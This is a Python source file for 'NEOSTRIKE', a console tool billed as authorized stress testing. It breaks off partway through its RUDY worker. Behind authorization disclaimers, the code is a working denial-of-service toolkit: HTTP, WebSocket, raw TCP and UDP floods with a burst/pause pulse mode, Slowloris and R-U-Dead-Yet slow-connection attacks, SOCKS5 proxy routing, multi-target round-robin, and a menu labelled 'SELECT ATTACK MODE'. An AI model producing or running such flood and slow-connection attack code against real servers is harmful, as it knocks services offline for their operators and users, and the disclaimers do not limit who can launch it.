#!/usr/bin/env python3
# =============================================================================
#  NEOSTRIKE  -  Authorized Load & Stress Testing Console
# =============================================================================
#
#  FOR AUTHORIZED TESTING ONLY - ON INFRASTRUCTURE YOU OWN OR HAVE EXPLICIT
#  WRITTEN PERMISSION TO TEST. Unauthorized use against systems you do not
#  control is illegal in most jurisdictions and unethical.
#
#  Install:  pip install -r requirements.txt
#  Run:      python neostrike.py [--config preset.json] [--export results.json]
#  Requires: Python 3.10+
# =============================================================================

from __future__ import annotations

import argparse
import asyncio
import csv
import io
import json
import logging
import os
import platform
import random
import re
import signal
import socket
import struct
import sys
import threading
import time
from collections import Counter, deque
from dataclasses import dataclass, field, asdict
from datetime import datetime
from typing import Optional

# --- Third-party ------------------------------------------------------------
try:
    import aiohttp
except ImportError:
    print("Missing dependency 'aiohttp'. Install with: pip install aiohttp")
    sys.exit(1)

try:
    from rich.align import Align
    from rich.console import Console, Group
    from rich.layout import Layout
    from rich.live import Live
    from rich.panel import Panel
    from rich.prompt import Prompt, Confirm
    from rich.table import Table
    from rich.text import Text
    from rich.theme import Theme
except ImportError:
    print("Missing dependency 'rich'. Install with: pip install rich")
    sys.exit(1)


# =============================================================================
#  CONFIGURABLE DEFAULTS
# =============================================================================

DEFAULT_CONCURRENCY: int = 100
MAX_CONCURRENCY: int = 5000
DEFAULT_HTTP_METHOD: str = "GET"

REQUEST_TIMEOUT: float = 10.0
CONNECT_TIMEOUT: float = 5.0
TCP_UDP_TIMEOUT: float = 4.0

REQUEST_RATE_CAP: Optional[int] = 5000

DEFAULT_POST_BODY: str = '{"neostrike": "test"}'
RAW_FLOOD_PAYLOAD_SIZE: int = 1024
DEFAULT_USER_AGENT: str = "NEOSTRIKE/1.0 (+authorized-load-test)"
DEFAULT_HTTP_PATH: str = "/"

DEFAULT_HEADERS: dict[str, str] = {
    "User-Agent": DEFAULT_USER_AGENT,
    "Accept": "*/*",
    "Connection": "keep-alive",
}

UI_REFRESH_PER_SEC: int = 12
RECENT_FEED_SIZE: int = 12
STATS_WINDOW_SECONDS: float = 5.0

SLOWLORIS_HEADER_INTERVAL: float = 8.0
SLOWLORIS_INITIAL_BYTES: int = 50
SLOWLORIS_CONNECT_TIMEOUT: float = 30.0

RUDY_POST_INTERVAL: float = 0.5
RUDY_CONNECT_TIMEOUT: float = 30.0

DEFAULT_PULSE_BURST: float = 4.0
DEFAULT_PULSE_PAUSE: float = 2.0

LOG_DIR: str = "neostrike_logs"
LOG_LEVEL: int = logging.INFO

NEON_CYAN = "#00f0ff"
ELECTRIC_PURPLE = "#b026ff"
HOT_PINK = "#ff2d95"
ACID_GREEN = "#39ff14"
WARN_AMBER = "#ffb000"
DEEP_BLACK = "#05060a"
DIM_GREY = "#5a6473"

THEME = Theme(
    {
        "ns.cyan": f"bold {NEON_CYAN}",
        "ns.purple": f"bold {ELECTRIC_PURPLE}",
        "ns.pink": f"bold {HOT_PINK}",
        "ns.green": f"bold {ACID_GREEN}",
        "ns.amber": f"bold {WARN_AMBER}",
        "ns.dim": DIM_GREY,
        "ns.label": f"bold {NEON_CYAN}",
        "ns.value": f"bold {HOT_PINK}",
        "ns.ok": f"bold {ACID_GREEN}",
        "ns.bad": f"bold {HOT_PINK}",
        "ns.warn": f"bold {WARN_AMBER}",
    }
)

console = Console(theme=THEME)


# =============================================================================
#  ASCII ART BANNER
# =============================================================================

BANNER = r"""
 ███▄    █ ▓█████  ▒█████    ██████ ▄▄▄█████▓ ██▀███   ██▓ ██ ▄█▀▓█████
 ██ ▀█   █ ▓█   ▀ ▒██▒  ██▒▒██    ▒ ▓  ██▒ ▓▒▓██ ▒ ██▒▓██▒ ██▄█▒ ▓█   ▀
▓██  ▀█ ██▒▒███   ▒██░  ██▒░ ▓██▄   ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██▒▓███▄░ ▒███
▓██▒  ▐▌██▒▒▓█  ▄ ▒██   ██░  ▒   ██▒░ ▓██▓ ░ ▒██▀▀█▄  ░██░▓██ █▄ ▒▓█  ▄
▒██░   ▓██░░▒████▒░ ████▓▒░▒██████▒▒  ▒██▒ ░ ░██▓ ▒██▒░██░▒██▒ █▄░▒████▒
░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒▓ ░▒▓░░▓  ▒ ▒▒ ▓▒░░ ▒░ ░
"""

SUBTITLE = "//  N E O S T R I K E   |  authorized stress-testing console  |  v2.1"


# =============================================================================
#  LOGGING SETUP
# =============================================================================

def setup_logger() -> tuple[logging.Logger, str]:
    os.makedirs(LOG_DIR, exist_ok=True)
    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_path = os.path.join(LOG_DIR, f"neostrike_{stamp}.log")

    logger = logging.getLogger("neostrike")
    logger.setLevel(LOG_LEVEL)
    logger.handlers.clear()

    fh = logging.FileHandler(log_path, encoding="utf-8")
    fmt = logging.Formatter(
        "%(asctime)s.%(msecs)03d | %(levelname)-7s | %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )
    fh.setFormatter(fmt)
    logger.addHandler(fh)
    logger.propagate = False
    return logger, log_path


# =============================================================================
#  CONFIGURATION DATACLASS
# =============================================================================

@dataclass
class TargetInfo:
    host: str
    port: Optional[int]
    scheme: str
    url: str
    path: str = "/"
    ip: str = ""


@dataclass
class TestConfig:
    targets: list[TargetInfo]
    method: str
    headers: dict[str, str]
    concurrency: int
    duration_s: Optional[float]
    request_target: Optional[int]
    rate_cap: Optional[int]
    proxy: Optional[str] = None
    pulse: tuple[float, float] = (0.0, 0.0)
    http_path: str = "/"


# =============================================================================
#  SHARED STATS
# =============================================================================

@dataclass
class Stats:
    started_at: float = 0.0
    sent: int = 0
    completed: int = 0
    errors: int = 0
    bytes_recv: int = 0
    status_counts: Counter = field(default_factory=Counter)
    error_counts: Counter = field(default_factory=Counter)
    feed: deque = field(default_factory=lambda: deque(maxlen=RECENT_FEED_SIZE))
    window: deque = field(default_factory=lambda: deque(maxlen=20000))
    active: int = 0
    lock: threading.Lock = field(default_factory=threading.Lock)

    def record(self, ok: bool, code: str, nbytes: int = 0, note: str = "") -> None:
        with self.lock:
            self.completed += 1
            now = time.monotonic()
            self.window.append(now)
            if ok:
                self.status_counts[code] += 1
                self.bytes_recv += nbytes
            else:
                self.errors += 1
                self.error_counts[code] += 1
            if note:
                self.feed.append((now, ok, note))

    @property
    def elapsed(self) -> float:
        return time.monotonic() - self.started_at if self.started_at else 0.0

    def current_rps(self) -> float:
        now = time.monotonic()
        cutoff = now - STATS_WINDOW_SECONDS
        with self.lock:
            while self.window and self.window[0] < cutoff:
                self.window.popleft()
            return len(self.window) / STATS_WINDOW_SECONDS

    def avg_rps(self) -> float:
        e = self.elapsed
        return self.completed / e if e > 0 else 0.0

    def to_dict(self) -> dict:
        with self.lock:
            return {
                "elapsed_s": round(self.elapsed, 2),
                "sent": self.sent,
                "completed": self.completed,
                "errors": self.errors,
                "bytes_recv": self.bytes_recv,
                "avg_rps": round(self.avg_rps(), 2),
                "current_rps": round(self.current_rps(), 2),
                "status_counts": dict(self.status_counts),
                "error_counts": dict(self.error_counts),
            }


# =============================================================================
#  INPUT VALIDATION HELPERS
# =============================================================================

DURATION_RE = re.compile(r"^\s*(\d+)\s*([smhSMH]?)\s*$")


def parse_duration(text: str) -> Optional[float]:
    if not text:
        return None
    m = DURATION_RE.match(text)
    if not m:
        raise ValueError(f"Invalid duration: '{text}'. Use e.g. 30s, 5m, 1h.")
    value = int(m.group(1))
    unit = (m.group(2) or "s").lower()
    mult = {"s": 1, "m": 60, "h": 3600}[unit]
    return float(value * mult)


def normalize_target(raw: str, method: str, path_override: str = "") -> TargetInfo:
    raw = raw.strip()
    scheme = "http"
    host = raw
    port: Optional[int] = None
    path = path_override or DEFAULT_HTTP_PATH

    if "://" in raw:
        scheme, rest = raw.split("://", 1)
        scheme = scheme.lower()
    else:
        rest = raw

    if "/" in rest and not path_override:
        hostport, path = rest.split("/", 1)
        path = "/" + path
    else:
        hostport = rest

    if hostport.count(":") == 1:
        host, port_s = hostport.split(":", 1)
        if not port_s.isdigit():
            raise ValueError(f"Invalid port: '{port_s}'")
        port = int(port_s)
    else:
        host = hostport

    if not host:
        raise ValueError("Empty host.")

    if method in ("TCP", "UDP", "SLOWLORIS", "RUDY"):
        url = ""
        if port is None:
            raise ValueError(f"{method} mode requires a port (host:port).")
    else:
        if scheme not in ("http", "https"):
            scheme = "http"
        netloc = host if port is None else f"{host}:{port}"
        url = f"{scheme}://{netloc}{path}"

    return TargetInfo(host=host, port=port, scheme=scheme, url=url, path=path)


def resolve_host(host: str) -> str:
    try:
        return socket.gethostbyname(host)
    except socket.gaierror as exc:
        raise ValueError(f"DNS resolution failed for '{host}': {exc}") from exc


def parse_targets(text: str, method: str, path_override: str = "") -> list[TargetInfo]:
    targets: list[TargetInfo] = []
    for part in text.split(","):
        part = part.strip()
        if not part:
            continue
        ti = normalize_target(part, method, path_override)
        ti.ip = resolve_host(ti.host)
        targets.append(ti)
    if not targets:
        raise ValueError("No valid targets provided.")
    for ti in targets:
        console.print(f"[ns.green]  + resolved {ti.host} -> {ti.ip}"
                      f"{(':' + str(ti.port)) if ti.port else ''}[/]")
    return targets


def load_preset(path: str) -> dict:
    with open(path, "r", encoding="utf-8") as f:
        data = json.load(f)
    return data


def save_preset(path: str, cfg: dict) -> None:
    os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=2)
    console.print(f"[ns.green]  + Preset saved to {path}[/]")


def list_presets(preset_dir: str) -> None:
    if not os.path.isdir(preset_dir):
        console.print(f"[ns.dim]  No presets directory found at {preset_dir}[/]")
        return
    files = [f for f in os.listdir(preset_dir) if f.endswith(".json")]
    if not files:
        console.print("[ns.dim]  No preset files found[/]")
        return
    for f in sorted(files):
        full = os.path.join(preset_dir, f)
        try:
            data = load_preset(full)
            mode = data.get("mode", "?")
            target = data.get("target", "?")
            console.print(f"  [ns.cyan]{f}[/]  mode={mode}  target={target}")
        except Exception:
            console.print(f"  [ns.dim]{f}[/]")


# =============================================================================
#  EXPORT FUNCTIONS
# =============================================================================

def export_json(cfg: TestConfig, stats: Stats, path: str) -> None:
    report = {
        "neostrike_version": "2.1",
        "timestamp": datetime.now().isoformat(),
        "config": {
            "targets": [ti.url or f"{ti.host}:{ti.port}" for ti in cfg.targets],
            "method": cfg.method,
            "concurrency": cfg.concurrency,
            "duration_s": cfg.duration_s,
            "request_target": cfg.request_target,
            "rate_cap": cfg.rate_cap,
            "proxy": cfg.proxy,
            "pulse": {"burst": cfg.pulse[0], "pause": cfg.pulse[1]} if cfg.pulse != (0.0, 0.0) else None,
            "http_path": cfg.http_path,
        },
        "results": stats.to_dict(),
    }
    with open(path, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2, default=str)
    console.print(f"[ns.green]  + Results exported to {path}[/]")


def export_csv(cfg: TestConfig, stats: Stats, path: str) -> None:
    with open(path, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["metric", "value"])
        writer.writerow(["timestamp", datetime.now().isoformat()])
        writer.writerow(["targets", ", ".join(ti.url or f"{ti.host}:{ti.port}" for ti in cfg.targets)])
        writer.writerow(["method", cfg.method])
        writer.writerow(["concurrency", cfg.concurrency])
        writer.writerow(["duration_s", cfg.duration_s or ""])
        writer.writerow(["sent", stats.sent])
        writer.writerow(["completed", stats.completed])
        writer.writerow(["errors", stats.errors])
        writer.writerow(["bytes_recv", stats.bytes_recv])
        writer.writerow(["avg_rps", round(stats.avg_rps(), 2)])
        writer.writerow(["current_rps", round(stats.current_rps(), 2)])
        for code, n in sorted(stats.status_counts.items(), key=lambda x: -x[1]):
            writer.writerow([f"status_{code}", n])
        for code, n in sorted(stats.error_counts.items(), key=lambda x: -x[1]):
            writer.writerow([f"error_{code}", n])
    console.print(f"[ns.green]  + Results exported to {path}[/]")


# =============================================================================
#  INTERACTIVE CONFIGURATION SEQUENCE
# =============================================================================

def show_disclaimer() -> bool:
    console.clear()
    banner_text = Text(BANNER, style="ns.purple")
    sub = Text(SUBTITLE, style="ns.cyan")
    console.print(Align.center(banner_text))
    console.print(Align.center(sub))
    console.print()

    warn_body = Text()
    warn_body.append("AUTHORIZED TESTING ONLY\n\n", style="ns.pink")
    warn_body.append(
        "This tool generates high-volume traffic and is intended SOLELY for "
        "stress-testing servers and infrastructure that YOU OWN or for which "
        "you hold EXPLICIT WRITTEN PERMISSION to test.\n\n",
        style="ns.amber",
    )
    warn_body.append(
        "Directing this traffic at systems you do not control may be illegal "
        "(e.g. computer-misuse / anti-DoS statutes) and is strictly against "
        "the intended use. You are solely responsible for your actions.",
        style="ns.dim",
    )
    console.print(
        Panel(
            warn_body,
            title="[ns.pink]!  DISCLAIMER  ![/]",
            border_style=HOT_PINK,
            padding=(1, 3),
        )
    )
    console.print()
    return Confirm.ask(
        "[ns.cyan]I confirm I am authorized to test the target[/]",
        default=False,
    )


def prompt_method() -> str:
    methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "TCP", "UDP", "SLOWLORIS", "RUDY", "WEBSOCKET"]
    table = Table(box=None, padding=(0, 2))
    table.add_column("#", style="ns.pink")
    table.add_column("Mode", style="ns.cyan")
    table.add_column("Description", style="ns.dim")
    desc = {
        "GET": "Standard HTTP GET flood",
        "POST": "HTTP POST with body payload",
        "HEAD": "Lightweight headers-only flood",
        "PUT": "HTTP PUT with body payload",
        "DELETE": "HTTP DELETE flood",
        "TCP": "Raw TCP connection/packet flood",
        "UDP": "Raw UDP packet flood",
        "SLOWLORIS": "Low-bandwidth connection exhaustion",
        "RUDY": "R-U-Dead-Yet slow POST attack",
        "WEBSOCKET": "WebSocket connection flood",
    }
    for i, m in enumerate(methods, 1):
        table.add_row(str(i), m, desc[m])
    console.print(Panel(table, title="[ns.cyan]SELECT ATTACK MODE[/]",
                        border_style=ELECTRIC_PURPLE))

    default_idx = str(methods.index(DEFAULT_HTTP_METHOD) + 1)
    choice = Prompt.ask(
        "[ns.cyan]Mode #[/]",
        choices=[str(i) for i in range(1, len(methods) + 1)],
        default=default_idx,
    )
    return methods[int(choice) - 1]


def prompt_headers() -> dict[str, str]:
    headers: dict[str, str] = {}
    if not Confirm.ask("[ns.cyan]Add custom headers?[/]", default=False):
        return headers
    console.print("[ns.dim]Enter headers as 'Key: Value'. Blank line to finish.[/]")
    while True:
        line = Prompt.ask("[ns.pink]header[/]", default="")
        if not line.strip():
            break
        if ":" not in line:
            console.print("[ns.warn]  -> invalid format, expected 'Key: Value'[/]")
            continue
        k, v = line.split(":", 1)
        headers[k.strip()] = v.strip()
        console.print(f"[ns.green]  + {k.strip()} set[/]")
    return headers


def prompt_path() -> str:
    path = Prompt.ask(
        "[ns.cyan]HTTP path[/] [ns.dim](e.g. /api/login, /admin/dashboard)[/]",
        default="/",
    )
    if not path.startswith("/"):
        path = "/" + path
    return path


def configure() -> Optional[TestConfig]:
    method = prompt_method()

    while True:
        raw = Prompt.ask(
            "[ns.cyan]Target(s)[/] [ns.dim](comma-separated: host, host:port, or URL)[/]"
        )
        try:
            targets = parse_targets(raw, method)
            break
        except ValueError as exc:
            console.print(f"[ns.bad]  x {exc}[/]")

    http_path = "/"
    if method in ("GET", "POST", "HEAD", "PUT", "DELETE", "WEBSOCKET"):
        http_path = prompt_path()

    headers = dict(DEFAULT_HEADERS)
    headers.update(prompt_headers())

    proxy_url: Optional[str] = None
    if Confirm.ask("[ns.cyan]Route through proxy?[/]", default=False):
        proxy_url = Prompt.ask("[ns.cyan]Proxy URL[/] [ns.dim](e.g. socks5://127.0.0.1:1080)[/]")

    while True:
        try:
            conc = int(Prompt.ask("[ns.cyan]Concurrency level[/]",
                                  default=str(DEFAULT_CONCURRENCY)))
            if conc < 1:
                raise ValueError
            if conc > MAX_CONCURRENCY:
                console.print(f"[ns.warn]  -> capped to MAX_CONCURRENCY="
                              f"{MAX_CONCURRENCY}[/]")
                conc = MAX_CONCURRENCY
            break
        except ValueError:
            console.print("[ns.bad]  x enter a positive integer[/]")

    duration_s: Optional[float] = None
    while True:
        dtxt = Prompt.ask(
            "[ns.cyan]Duration[/] [ns.dim](e.g. 30s, 5m - blank = until stopped)[/]",
            default="",
        )
        try:
            duration_s = parse_duration(dtxt)
            break
        except ValueError as exc:
            console.print(f"[ns.bad]  x {exc}[/]")

    req_target: Optional[int] = None
    rtxt = Prompt.ask(
        "[ns.cyan]Request count target[/] [ns.dim](blank = unlimited)[/]",
        default="",
    )
    if rtxt.strip():
        try:
            req_target = int(rtxt)
            if req_target < 1:
                req_target = None
        except ValueError:
            console.print("[ns.warn]  -> invalid count, ignoring[/]")

    rate_cap = REQUEST_RATE_CAP if REQUEST_RATE_CAP else None

    pulse: tuple[float, float] = (0.0, 0.0)
    if method in ("TCP", "UDP") and Confirm.ask(
            "[ns.cyan]Use pulse mode?[/] [ns.dim](burst/pause pattern)[/]", default=False):
        try:
            b = float(Prompt.ask("[ns.cyan]Burst seconds[/]", default=str(DEFAULT_PULSE_BURST)))
            p = float(Prompt.ask("[ns.cyan]Pause seconds[/]", default=str(DEFAULT_PULSE_PAUSE)))
            pulse = (max(0.1, b), max(0.1, p))
        except ValueError:
            console.print("[ns.warn]  -> invalid, pulse disabled[/]")

    cfg = TestConfig(
        targets=targets,
        method=method,
        headers=headers,
        concurrency=conc,
        duration_s=duration_s,
        request_target=req_target,
        rate_cap=rate_cap,
        proxy=proxy_url,
        pulse=pulse,
        http_path=http_path,
    )

    _print_config_review(cfg)
    if not Confirm.ask("[ns.pink]Launch flood now?[/]", default=True):
        return None
    return cfg


def _print_config_review(cfg: TestConfig) -> None:
    t = Table(box=None, padding=(0, 2))
    t.add_column("Parameter", style="ns.label")
    t.add_column("Value", style="ns.value")
    target_str = ", ".join(ti.url or f"{ti.host}:{ti.port}" for ti in cfg.targets)
    t.add_row("Targets", target_str)
    t.add_row("Mode", cfg.method)
    t.add_row("Concurrency", str(cfg.concurrency))
    t.add_row("Duration", f"{cfg.duration_s:.0f}s" if cfg.duration_s else "inf (manual stop)")
    t.add_row("Request target", str(cfg.request_target) if cfg.request_target else "inf")
    t.add_row("Rate cap", f"{cfg.rate_cap}/s" if cfg.rate_cap else "unlimited")
    t.add_row("HTTP path", cfg.http_path)
    t.add_row("Custom headers", str(len(cfg.headers)))
    if cfg.proxy:
        t.add_row("Proxy", cfg.proxy)
    if cfg.pulse != (0.0, 0.0):
        t.add_row("Pulse", f"burst={cfg.pulse[0]:.1f}s pause={cfg.pulse[1]:.1f}s")
    console.print(Panel(t, title="[ns.cyan]CONFIGURATION REVIEW[/]",
                        border_style=NEON_CYAN))


# =============================================================================
#  RATE LIMITER (token bucket)
# =============================================================================

class RateLimiter:
    def __init__(self, rate: Optional[int]):
        self.rate = rate
        self._tokens = float(rate) if rate else 0.0
        self._last = time.monotonic()
        self._lock = asyncio.Lock()

    async def acquire(self) -> None:
        if not self.rate:
            return
        async with self._lock:
            while True:
                now = time.monotonic()
                self._tokens += (now - self._last) * self.rate
                self._last = now
                if self._tokens > self.rate:
                    self._tokens = float(self.rate)
                if self._tokens >= 1.0:
                    self._tokens -= 1.0
                    return
                wait = (1.0 - self._tokens) / self.rate
                await asyncio.sleep(wait)


# =============================================================================
#  STOP CONTROLLER (Q key + Ctrl+C)
# =============================================================================

class StopController:
    def __init__(self):
        self.event = threading.Event()
        self._listener: Optional[threading.Thread] = None

    def request_stop(self) -> None:
        self.event.set()

    @property
    def stopped(self) -> bool:
        return self.event.is_set()

    def start_key_listener(self) -> None:
        self._listener = threading.Thread(target=self._listen, daemon=True)
        self._listener.start()

    def _listen(self) -> None:
        try:
            if platform.system() == "Windows":
                import msvcrt
                while not self.stopped:
                    if msvcrt.kbhit():
                        ch = msvcrt.getch().decode(errors="ignore").lower()
                        if ch == "q":
                            self.request_stop()
                            return
                    time.sleep(0.05)
            else:
                import termios
                import tty
                import select
                fd = sys.stdin.fileno()
                old = termios.tcgetattr(fd)
                try:
                    tty.setcbreak(fd)
                    while not self.stopped:
                        r, _, _ = select.select([sys.stdin], [], [], 0.1)
                        if r:
                            ch = sys.stdin.read(1).lower()
                            if ch == "q":
                                self.request_stop()
                                return
                finally:
                    termios.tcsetattr(fd, termios.TCSADRAIN, old)
        except Exception:
            return


# =============================================================================
#  SOCKS5 PROXY HELPER
# =============================================================================

def socks5_connect(proxy_host: str, proxy_port: int,
                   target_host: str, target_port: int) -> socket.socket:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(CONNECT_TIMEOUT)
    s.connect((proxy_host, proxy_port))
    s.sendall(b"\x05\x01\x00")
    if s.recv(2) != b"\x05\x00":
        s.close()
        raise ConnectionError("SOCKS5 proxy requires auth, not supported.")
    host_bytes = socket.inet_aton(socket.gethostbyname(target_host))
    port_bytes = target_port.to_bytes(2, "big")
    req = b"\x05\x01\x00\x01" + host_bytes + port_bytes
    s.sendall(req)
    resp = s.recv(10)
    if len(resp) < 4 or resp[1] != 0x00:
        s.close()
        raise ConnectionError(f"SOCKS5 connection refused (code={resp[1] if len(resp) > 1 else '?'})")
    return s


# =============================================================================
#  TARGET PICKER (round-robin for multi-target)
# =============================================================================

_target_index: dict[int, int] = {}

def pick_target(cfg: TestConfig) -> TargetInfo:
    tid = threading.get_ident()
    idx = _target_index.get(tid, 0) % len(cfg.targets)
    _target_index[tid] = idx + 1
    return cfg.targets[idx]


# =============================================================================
#  WORKERS - HTTP (asyncio + aiohttp)
# =============================================================================

async def http_worker(
    cfg: TestConfig,
    stats: Stats,
    stopper: StopController,
    limiter: RateLimiter,
    session: aiohttp.ClientSession,
    logger: logging.Logger,
) -> None:
    body = None
    if cfg.method in ("POST", "PUT"):
        body = DEFAULT_POST_BODY.encode()
    target_idx = random.randrange(len(cfg.targets))

    while not stopper.stopped:
        with stats.lock:
            if cfg.request_target and stats.sent >= cfg.request_target:
                return
            stats.sent += 1
            stats.active += 1

        await limiter.acquire()

        target = cfg.targets[target_idx % len(cfg.targets)]
        target_idx += 1

        try:
            async with session.request(
                cfg.method, target.url, data=body, allow_redirects=False
            ) as resp:
                data = await resp.read()
                code = str(resp.status)
                ok = resp.status < 500
                stats.record(ok, code, len(data),
                             note=f"{cfg.method} -> {code} ({len(data)}B)")
                logger.info("REQ method=%s url=%s status=%s bytes=%d",
                            cfg.method, target.url, code, len(data))
        except asyncio.TimeoutError:
            stats.record(False, "TIMEOUT", note="timeout")
            logger.warning("REQ method=%s url=%s error=timeout", cfg.method, target.url)
        except aiohttp.ClientConnectorError as exc:
            stats.record(False, "CONN_ERR", note="conn-err")
            logger.error("REQ method=%s url=%s error=conn:%s", cfg.method, target.url, exc)
        except aiohttp.ClientError as exc:
            stats.record(False, "CLIENT_ERR", note="client-err")
            logger.error("REQ method=%s url=%s error=client:%s", cfg.method, target.url, exc)
        except Exception as exc:
            stats.record(False, "UNKNOWN", note="exception")
            logger.exception("REQ method=%s url=%s unexpected: %s",
                             cfg.method, target.url, exc)
        finally:
            with stats.lock:
                stats.active -= 1


# =============================================================================
#  WORKER - WEBSOCKET FLOOD
# =============================================================================

async def websocket_worker(
    cfg: TestConfig,
    stats: Stats,
    stopper: StopController,
    limiter: RateLimiter,
    logger: logging.Logger,
) -> None:
    target_idx = random.randrange(len(cfg.targets))

    while not stopper.stopped:
        with stats.lock:
            if cfg.request_target and stats.sent >= cfg.request_target:
                return
            stats.sent += 1
            stats.active += 1

        await limiter.acquire()

        target = cfg.targets[target_idx % len(cfg.targets)]
        target_idx += 1
        ws_url = target.url.replace("http://", "ws://").replace("https://", "wss://")

        try:
            async with aiohttp.ClientSession() as session:
                async with session.ws_connect(ws_url) as ws:
                    # Send random data to keep connection alive and generate traffic
                    while not stopper.stopped:
                        payload = random.randbytes(random.randint(64, 1024))
                        await ws.send_bytes(payload)
                        stats.record(True, "WS_SENT", len(payload),
                                     note=f"WS -> {len(payload)}B")
                        logger.info("WS url=%s bytes=%d", ws_url, len(payload))
                        await asyncio.sleep(0.01)
        except asyncio.TimeoutError:
            stats.record(False, "WS_TIMEOUT", note="ws-timeout")
            logger.warning("WS url=%s error=timeout", ws_url)
        except aiohttp.ClientError as exc:
            stats.record(False, "WS_CONN_ERR", note="ws-conn-err")
            logger.error("WS url=%s error=%s", ws_url, exc)
        except Exception as exc:
            stats.record(False, "WS_UNKNOWN", note="ws-exception")
            logger.exception("WS url=%s unexpected: %s", ws_url, exc)
        finally:
            with stats.lock:
                stats.active -= 1


# =============================================================================
#  WORKERS - RAW TCP/UDP (threads)
# =============================================================================

def raw_worker(
    cfg: TestConfig,
    stats: Stats,
    stopper: StopController,
    logger: logging.Logger,
) -> None:
    payload = random.randbytes(RAW_FLOOD_PAYLOAD_SIZE)
    target_idx = random.randrange(len(cfg.targets))

    proxy_host: Optional[str] = None
    proxy_port: Optional[int] = None
    if cfg.proxy:
        ph, _, pp = cfg.proxy.partition(":")
        proxy_host = ph.strip()
        proxy_port = int(pp.strip()) if pp else 1080

    target_ips: list[tuple[str, int]] = []
    for t in cfg.targets:
        target_ips.append((resolve_host(t.host), int(t.port or 0)))

    if cfg.method == "UDP":
        udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)

    while not stopper.stopped:
        if cfg.pulse != (0.0, 0.0):
            period = cfg.pulse[0] + cfg.pulse[1]
            pos = time.monotonic() % period
            if pos > cfg.pulse[0]:
                time.sleep(min(0.05, cfg.pulse[1]))
                continue

        with stats.lock:
            if cfg.request_target and stats.sent >= cfg.request_target:
                return
            stats.sent += 1
            stats.active += 1

        target = target_ips[target_idx % len(target_ips)]
        target_idx += 1

        try:
            if cfg.method == "TCP":
                if proxy_host:
                    s = socks5_connect(proxy_host, proxy_port, target[0], target[1])
                else:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(TCP_UDP_TIMEOUT)
                    s.connect(target)
                s.sendall(payload)
                try:
                    s.recv(64)
                except socket.timeout:
                    pass
                s.close()
                stats.record(True, "TCP_OK", len(payload), note="TCP packet sent")
            else:
                udp_sock.sendto(payload, target)
                stats.record(True, "UDP_OK", len(payload), note="UDP packet sent")
        except socket.timeout:
            stats.record(False, "TIMEOUT", note="socket timeout")
            logger.warning("RAW proto=%s target=%s:%s error=timeout",
                           cfg.method, target[0], target[1])
        except (ConnectionRefusedError, OSError) as exc:
            stats.record(False, "CONN_ERR", note="conn-err")
            logger.error("RAW proto=%s target=%s:%s error=%s",
                         cfg.method, target[0], target[1], exc)
        except Exception as exc:
            stats.record(False, "UNKNOWN", note="exception")
            logger.exception("RAW unexpected: %s", exc)
        finally:
            with stats.lock:
                stats.active -= 1


# =============================================================================
#  WORKER - SLOWLORIS
# =============================================================================

def slowloris_worker(
    cfg: TestConfig,
    stats: Stats,
    stopper: StopController,
    logger: logging.Logger,
) -> None:
    target_idx = random.randrange(len(cfg.targets))

    while not stopper.stopped:
        target = cfg.targets[target_idx % len(cfg.targets)]
        target_idx += 1
        host = target.ip or resolve_host(target.host)
        port = int(target.port or 80)

        with stats.lock:
            if cfg.request_target and stats.sent >= cfg.request_target:
                return
            stats.sent += 1
            stats.active += 1

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(CONNECT_TIMEOUT)
            s.connect((host, port))
            partial = (
                f"GET {target.path} HTTP/1.1\r\n"
                f"Host: {target.host}\r\n"
                f"User-Agent: {DEFAULT_USER_AGENT}\r\n"
            ).encode()[:SLOWLORIS_INITIAL_BYTES]
            s.send(partial)
            deadline = time.monotonic() + SLOWLORIS_CONNECT_TIMEOUT
            while not stopper.stopped and time.monotonic() < deadline:
                try:
                    s.send(f"X-a: {random.randint(1, 99999)}\r\n".encode())
                except OSError:
                    break
                time.sleep(SLOWLORIS_HEADER_INTERVAL)
            s.close()
            stats.record(True, "SLOWLORIS", note="connection held")
            logger.info("SLOWLORIS target=%s:%s duration=%.1fs",
                        target.host, port, SLOWLORIS_CONNECT_TIMEOUT)
        except (socket.timeout, ConnectionRefusedError, OSError) as exc:
            stats.record(False, "CONN_ERR", note="slowloris-err")
            logger.warning("SLOWLORIS target=%s:%s error=%s", target.host, port, exc)
        except Exception as exc:
            stats.record(False, "UNKNOWN", note="exception")
            logger.exception("SLOWLORIS unexpected: %s", exc)
        finally:
            with stats.lock:
                stats.active -= 1


# =============================================================================
#  WORKER - RUDY (R-U-Dead-Yet)
# =============================================================================

def rudy_worker(
    cfg: TestConfig,
    stats: Stats,
    stopper: StopController,
    logger: logging.Logger,
) -> None:
    target_idx = random.randrange(len(cfg.targets))

    while not stopper.stopped:
        target = cfg.targets[target_idx % len(cfg.targets)]
        target_idx += 1
        host = target.ip or resolve_host(target.host)
        port = int(target.port or 80)

        with stats.lock:
            if cfg.request_target and stats.sent >= cfg.request_target:
                return
            stats.sent += 1
            stats.active += 1

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(RUDY_CONNECT_TIMEOUT)
            s.connect((host, port))

            # Send initial POST headers but never finish the body
            body_len = 100000000  # Claim huge body
            headers = (
                f"POST {target.path} HTTP/1.1\r\n"
                f"Host: {target.host}\r\n"
                f"Content-Length: {body_len}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"User-Agent: {DEFAULT_USER_AGENT}\r\n"
                f"\r\n"
            )
            s.send(headers.encode())

            # Send tiny body chunks slowly
            deadline = time.monotonic() + RUDY_CONNECT_TIMEOUT
            while not stopper.stopped and time.monotonic() < deadline:
                try:
                    s.send(b"a")
